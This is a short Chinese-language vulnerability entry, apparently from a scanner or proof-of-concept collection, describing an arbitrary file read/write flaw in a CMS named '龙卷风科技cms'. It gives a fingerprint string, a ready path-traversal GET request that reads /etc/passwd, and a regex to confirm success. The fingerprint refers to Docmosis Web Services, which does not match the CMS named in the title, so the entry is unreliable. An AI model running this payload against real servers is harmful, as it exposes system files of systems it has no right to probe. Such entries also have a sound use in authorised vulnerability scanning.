# 龙卷风科技cms文件读取漏洞

龙卷风科技cms ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="Welcome to Docmosis Web Services"`
- **请求**：`GET /api/../fetch?filename=/../../../../../etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$